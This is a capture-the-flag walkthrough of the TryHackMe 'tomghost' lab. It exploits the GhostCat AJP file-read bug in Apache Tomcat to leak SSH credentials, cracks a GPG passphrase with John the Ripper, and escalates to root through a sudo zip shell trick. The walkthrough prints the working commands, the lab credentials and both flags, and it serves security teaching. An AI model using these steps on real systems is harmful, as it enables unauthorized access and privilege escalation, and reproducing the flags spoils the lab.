
# tomghost

## Instructions

Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.

## Reconnaissance

### Services

Nmap full scan detects 4 open ports:

~~~
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3:c8:9f:0b:6a:c5:fe:95:54:0b:e9:e3:ba:93:db:7c (RSA)
|   256 dd:1a:09:f5:99:63:a3:43:0d:2d:90:d8:e3:e1:1f:b9 (ECDSA)
|_  256 48:d1:30:1b:38:6c:c6:53:ea:30:81:80:5d:0c:f1:05 (ED25519)
53/tcp   open  tcpwrapped
8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http       Apache Tomcat 9.0.30
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.30
~~~

As this challenge is about Apache Tomcat, let's focus on the web part. The website is running on port 8080 and shows a default Apache Tomcat page. Interestingly, AJP runs on port 8009/tcp, which is a prerequisite for our exploit, as we will see just after.

## Compromise this machine and obtain user.txt

The icon of the challenge shows a cat with the mention "GhostCat". It refers to CVE-2020-1938, a.k.a. the GhostCat vulnerability (https://nvd.nist.gov/vuln/detail/CVE-2020-1938).

*"CVE-2020-1938 is a file read/inclusion vulnerability in the AJP connector in Apache Tomcat. This is enabled by default with a default configuration port of 8009. A remote, unauthenticated attacker could exploit this vulnerability to read web application files from a vulnerable server. In instances where the vulnerable server allows file uploads, an attacker could upload malicious JavaServer Pages (JSP) code within a variety of file types and trigger this vulnerability to gain remote code execution (RCE).
Because AJP is enabled by default in the /conf/server.xml file in Apache Tomcat 6, 7, 8 and 9, all unpatched versions of Tomcat are vulnerable to Ghostcat."*

There are many exploits available on github. I chose this one because it is for python3: https://raw.githubusercontent.com/Digitemis/Ghostcat/master/exploit.py

Let's access the deployment description, located in `/WEB-INF/web.xml`:

~~~
$ python3 exploit.py read /WEB-INF/web.xml 10.10.159.44
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
   skyfuck:8730281lkjlkjdqlksalks
  </description>

</web-app>
~~~

We now have credentials that we will use to connect with ssh:
* username: `skyfuck`
* password: `8730281lkjlkjdqlksalks`

No flag in our `home` directory, but interesting files that we will analyze later.

~~~
skyfuck@ubuntu:~$ ll
total 44
drwxr-xr-x 4 skyfuck skyfuck 4096 May 13 00:59 ./
drwxr-xr-x 4 root    root    4096 Mar 10 21:58 ../
-rw------- 1 skyfuck skyfuck  136 Mar 10 22:45 .bash_history
-rw-r--r-- 1 skyfuck skyfuck  220 Mar 10 21:58 .bash_logout
-rw-r--r-- 1 skyfuck skyfuck 3771 Mar 10 21:58 .bashrc
drwx------ 2 skyfuck skyfuck 4096 May 13 00:58 .cache/
-rw-rw-r-- 1 skyfuck skyfuck  394 Mar 10 22:09 credential.pgp
drwx------ 2 skyfuck skyfuck 4096 May 13 01:00 .gnupg/
-rw-r--r-- 1 skyfuck skyfuck  655 Mar 10 21:58 .profile
-rw-rw-r-- 1 skyfuck skyfuck 5144 Mar 10 22:10 tryhackme.asc
~~~

Let's check if there are other users:

~~~
skyfuck@ubuntu:~$ cd /home/
skyfuck@ubuntu:/home$ ll
total 16
drwxr-xr-x  4 root    root    4096 Mar 10 21:58 ./
drwxr-xr-x 22 root    root    4096 Mar 10 18:09 ../
drwxr-xr-x  4 merlin  merlin  4096 Mar 10 22:58 merlin/
drwxr-xr-x  4 skyfuck skyfuck 4096 May 13 00:59 skyfuck/
skyfuck@ubuntu:/home$ cd merlin/
skyfuck@ubuntu:/home/merlin$ ll
total 36
drwxr-xr-x 4 merlin merlin 4096 Mar 10 22:58 ./
drwxr-xr-x 4 root   root   4096 Mar 10 21:58 ../
-rw------- 1 root   root   2090 Mar 10 22:54 .bash_history
-rw-r--r-- 1 merlin merlin  220 Mar 10 17:57 .bash_logout
-rw-r--r-- 1 merlin merlin 3771 Mar 10 17:57 .bashrc
drwx------ 2 merlin merlin 4096 Mar 10 17:59 .cache/
drwxrwxr-x 2 merlin merlin 4096 Mar 10 22:01 .nano/
-rw-r--r-- 1 merlin merlin  655 Mar 10 17:57 .profile
-rw-r--r-- 1 merlin merlin    0 Mar 10 17:59 .sudo_as_admin_successful
-rw-rw-r-- 1 merlin merlin   26 Mar 10 22:01 user.txt
skyfuck@ubuntu:/home/merlin$ cat user.txt 
THM{GhostCat_1s_so_cr4sy}
~~~

Flag: `THM{GhostCat_1s_so_cr4sy}`


## Escalate privileges and obtain root.txt

Let's start by listing our privileges:

~~~
$ sudo -l
[sudo] password for skyfuck: 
Sorry, user skyfuck may not run sudo on ubuntu.
~~~

Too bad, we are not in the sudoers. Let's go back to the files we have discovered in our `home`:

~~~
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 
gpg: directory `/home/skyfuck/.gnupg' created
gpg: new configuration file `/home/skyfuck/.gnupg/gpg.conf' created
gpg: WARNING: options in `/home/skyfuck/.gnupg/gpg.conf' are not yet active during this run
gpg: keyring `/home/skyfuck/.gnupg/secring.gpg' created
gpg: keyring `/home/skyfuck/.gnupg/pubring.gpg' created
gpg: encrypted with ELG-E key, ID 6184FBCC
gpg: decryption failed: secret key not available
skyfuck@ubuntu:~$ gpg --import tryhackme.asc 
gpg: key C6707170: secret key imported
gpg: /home/skyfuck/.gnupg/trustdb.gpg: trustdb created
gpg: key C6707170: public key "tryhackme <stuxnet@tryhackme.com>" imported
gpg: key C6707170: "tryhackme <stuxnet@tryhackme.com>" not changed
gpg: Total number processed: 2
gpg:               imported: 1
gpg:              unchanged: 1
gpg:       secret keys read: 1
gpg:   secret keys imported: 1
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: Invalid passphrase; please try again ...

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

Enter passphrase: 
gpg: Interrupt caught ... exiting
~~~

We need a passphrase to decrypt the message. Let's get the files locally:

~~~
$ scp -r skyfuck@10.10.159.44:{credential.pgp,tryhackme.asc} .
skyfuck@10.10.159.44's password: 
credential.pgp                                                                      100%  394     7.1KB/s   00:00    
skyfuck@10.10.159.44's password: 
tryhackme.asc                                                                       100% 5144    99.8KB/s   00:00    
~~~

Let's crack it with John the ripper.

~~~
$ /data/src/john-1.9.0-jumbo-1/run/gpg2john tryhackme.asc > gpg.hash

File tryhackme.asc
$ /data/src/john-1.9.0-jumbo-1/run/john gpg.hash --wordlist=/data/src/wordlists/rockyou.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65536 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 9 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
alexandru        (tryhackme)
1g 0:00:00:00 DONE (2020-05-13 13:12) 7.142g/s 7657p/s 7657c/s 7657C/s marshall..alexandru
Use the "--show" option to display all of the cracked passwords reliably
Session completed
~~~

Now, we have the passphrase: `alexandru`.

Back to the server, import the key if not done already (`gpg --import tryhackme.asc `) and decrypt the message:

~~~
skyfuck@ubuntu:~$ gpg --decrypt credential.pgp 

You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11 (main key ID C6707170)

gpg: gpg-agent is not available in this session
gpg: WARNING: cipher algorithm CAST5 not found in recipient preferences
gpg: encrypted with 1024-bit ELG-E key, ID 6184FBCC, created 2020-03-11
      "tryhackme <stuxnet@tryhackme.com>"
merlin:asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j
~~~

We now have merlin's credentials:
* username: `merlin`
* password: `asuyusdoiuqoilkda312j31k2j123j1g23g12k3g12kj3gk12jg3k12j3kj123j`

Let's switch to `merlin` and check our privileges:

~~~
skyfuck@ubuntu:~$ su - merlin
Password: 
merlin@ubuntu:~$ sudo -l
Matching Defaults entries for merlin on ubuntu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
~~~

We can run `zip` with `root` access. Let's check [here](https://gtfobins.github.io/gtfobins/zip/) what we can do with this.

Escalation with `sudo`:

~~~
merlin@ubuntu:~$ TF=$(mktemp -u)
merlin@ubuntu:~$ sudo zip $TF /etc/hosts -T -TT 'sh #'
  adding: etc/hosts (deflated 31%)
# whoami
root
# cd /root
# ls -l
total 8
-rw-r--r-- 1 root root   17 Mar 10 22:26 root.txt
drwxr-xr-x 2 root root 4096 Mar 10 22:25 ufw
# cat root.txt
THM{Z1P_1S_FAKE}
~~~

Root flag: `THM{Z1P_1S_FAKE}`
